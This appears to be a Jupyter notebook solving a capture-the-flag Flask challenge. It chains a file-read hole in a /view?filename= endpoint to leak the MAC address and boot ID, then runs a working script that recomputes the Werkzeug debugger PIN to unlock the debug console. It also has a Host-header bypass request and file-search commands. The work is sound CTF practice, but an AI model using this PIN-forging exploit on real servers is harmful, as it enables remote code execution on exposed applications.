In [35]:
import httpx

https://docs.kernel.org/filesystems/proc.html
https://fernandovillalba.substack.com/p/a-journey-into-the-linux-proc-filesystem
https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/
https://comradelab.win/2023/03/proc-enumeration/
https://blog.gregscharf.com/2023/04/09/lfi-to-rce-in-flask-werkzeug-application/
https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/
https://serverfault.com/questions/357811/find-mac-addresses-in-proc-or-somewhere-despite-bonding-device
https://idafchev.github.io/enumeration/2018/03/05/linux_proc_enum.html

nobody@49b0ff5b760f:/app$ pip freeze
WARNING: The directory '/nonexistent/.cache/pip' or its parent directory is not owned or is not writable by the current user. The cache has been disabled. Check the permissions and owner of that directory. If executing pip with sudo, you should use sudo's -H flag.
blinker==1.9.0
click==8.2.1
Flask==3.1.1
itsdangerous==2.2.0
Jinja2==3.1.6
MarkupSafe==3.0.2
Werkzeug==3.1.3

https://github.com/pallets/werkzeug/blob/504a8c4fbda9b8b2fd09e817544ffd228f23458e/src/werkzeug/debug/__init__.py#L306C1-L311C12
```
        """List of domains to allow requests to the debugger from. A leading dot
        allows all subdomains. This only allows ``".localhost"`` domains by
        default.

        .. versionadded:: 3.0.3
        """
```

❯ curl -H "Host: example.com" http://localhost:5555/console


nobody@49b0ff5b760f:/proc/1$ find / -type f -print0 | xargs -0 -I {} sh -c 'timeout 1s grep -q "flag.txt" "{}" && echo "[+] Found in: {}"' 2>/dev/null
nobody@49b0ff5b760f:/proc/1$ find / -type f -print0 | xargs -0 -I {} sh -c 'timeout 1s grep -q "flag-" "{}" && echo "[+] Found in: {}"' 2>/dev/null

In [36]:
base = "https://my-flask-app-754w6o1wkcsn.chals.sekai.team:1337"

def getContent(file):
    return httpx.get(
        f"{base}/view?filename={file}"
    ).content.decode("ASCII").strip()

In [37]:
getContent("/sys/class/net/eth0/address").replace(":","")

'e64c0ad338ef'

In [38]:
getContent("/proc/sys/kernel/random/boot_id")

'86480826-5520-4b61-993f-04cd54bfe4f9'

In [39]:
import hashlib
import itertools
from itertools import chain

def crack_sha1(username, modname, appname, flaskapp_path, node_uuid, machine_id):
    h = hashlib.sha1()
    crack(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)

def crack(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_id):
    probably_public_bits = [
            username,
            modname,
            appname,
            flaskapp_path ]
    private_bits = [
            node_uuid,
            machine_id ]

    h = hasher
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    print(rv)

In [40]:
print(getContent("/proc/self/cgroup"))

0::/


https://github.com/pallets/werkzeug/blob/504a8c4fbda9b8b2fd09e817544ffd228f23458e/src/werkzeug/debug/__init__.py#L142C5-L142C28

```python
modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
username: str | None

try:
    # getuser imports the pwd module, which does not exist in Google
    # App Engine. It may also raise a KeyError if the UID does not
    # have a username, such as in Docker.
    username = getpass.getuser()
# Python >= 3.13 only raises OSError
except (ImportError, KeyError, OSError):
    username = None

mod = sys.modules.get(modname)

# This information only exists to make the cookie unique on the
# computer, not as a security feature.
probably_public_bits = [
    username,
    modname,
    getattr(app, "__name__", type(app).__name__),
    getattr(mod, "__file__", None),
]
```

```python
private_bits = [str(uuid.getnode()), get_machine_id()]
```

In [41]:
usernames = ['nobody'] # Dockerfile
modnames = ['flask.app'] # Check console locally
appnames = ['Flask'] # Check console locally
flaskpaths = ['/usr/local/lib/python3.11/site-packages/flask/app.py'] # Check console locally
nodeuuids = [str(int(getContent("/sys/class/net/eth0/address").replace(":",""),16))] # Check docker container locally
machineids = [getContent("/proc/sys/kernel/random/boot_id")] # Check docker container locally

# Generate all possible combinations of values
combinations = itertools.product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids)

# Iterate over the combinations and call the crack() function for each one
for combo in combinations:
    username, modname, appname, flaskpath, nodeuuid, machineid = combo
    print('==========================================================================')
    crack_sha1(username, modname, appname, flaskpath, nodeuuid, machineid)
    print(f'{combo}')
    print('==========================================================================')

572-014-344
('nobody', 'flask.app', 'Flask', '/usr/local/lib/python3.11/site-packages/flask/app.py', '253214273517807', '86480826-5520-4b61-993f-04cd54bfe4f9')
